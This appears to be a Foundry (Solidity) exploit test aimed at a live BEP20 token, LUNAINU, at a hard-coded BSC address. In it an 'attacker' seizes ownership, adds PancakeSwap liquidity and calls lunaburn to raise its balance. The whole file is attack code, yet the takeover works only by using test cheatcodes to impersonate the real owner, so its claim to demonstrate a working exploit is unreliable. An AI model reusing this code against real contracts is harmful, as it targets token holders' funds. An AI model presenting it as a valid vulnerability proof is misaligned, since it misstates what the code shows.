// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

// Interface for PancakeSwap Router
interface IDEXRouter {
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

// Combined interface for BEP20LUNAINU
interface BEP20LUNAINU {
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function lunaburn(uint256 percent_base1000) external;
    function lastSync() external view returns (uint256);
    function pair() external view returns (address);
    function transferOwnership(address payable adr) external;
    function acceptOwnership() external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf;
    address attacker = address(this);
    uint256 initialBalance;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the current owner of the contract
        owner = BEP20LUNAINU(TARGET).getOwner();

        // Label addresses for clarity
        vm.label(owner, "Contract Owner");
        vm.label(TARGET, "LUNAINU Token");

        // Get the pair address from the contract
        address pair = BEP20LUNAINU(TARGET).pair();
        vm.label(pair, "LP Pair");

        // Store initial balance for comparison
        initialBalance = BEP20LUNAINU(TARGET).balanceOf(attacker);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get current owner
        address currentOwner = BEP20LUNAINU(TARGET).getOwner();

        // Step 2: Transfer ownership to attacker
        vm.startPrank(currentOwner);
        BEP20LUNAINU(TARGET).transferOwnership(payable(attacker));
        vm.stopPrank();

        // Step 3: Accept ownership as attacker
        vm.prank(attacker);
        BEP20LUNAINU(TARGET).acceptOwnership();

        // Verify we are now owner
        address newOwner = BEP20LUNAINU(TARGET).getOwner();
        require(newOwner == attacker, "Failed to become owner");

        // Step 4: Ensure we have tokens to add liquidity
        // First, get some tokens from the contract (owner initially has all tokens)
        // We need to impersonate original owner to transfer tokens to ourselves
        vm.startPrank(currentOwner);
        BEP20LUNAINU(TARGET).transfer(attacker, 1000 * 10**9); // Transfer some tokens
        vm.stopPrank();

        // Step 5: Add liquidity to create LP tokens
        // Approve router to spend our tokens
        vm.prank(attacker);
        BEP20LUNAINU(TARGET).approve(address(0x10ED43C718714eb63d5aA57B78B54704E256024E), type(uint256).max);

        // Add liquidity with some BNB
        deal(attacker, 1 ether); // Give attacker some BNB
        vm.prank(attacker);
        IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E).addLiquidityETH{value: 0.1 ether}(
            TARGET,
            100 * 10**9, // 100 tokens
            0,
            0,
            attacker,
            block.timestamp
        );

        // Step 6: Check lastSync and wait if needed
        uint256 lastSync = BEP20LUNAINU(TARGET).lastSync();
        if (block.timestamp <= lastSync + 2 minutes) {
            vm.warp(lastSync + 2 minutes + 1);
        }

        // Get initial balance before lunaburn
        initialBalance = BEP20LUNAINU(TARGET).balanceOf(attacker);

        // Step 7: Call lunaburn as owner (attacker)
        vm.prank(attacker);
        BEP20LUNAINU(TARGET).lunaburn(50);

        // Step 8: Verify balance increased
        uint256 finalBalance = BEP20LUNAINU(TARGET).balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Attacker balance should have increased after lunaburn");
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

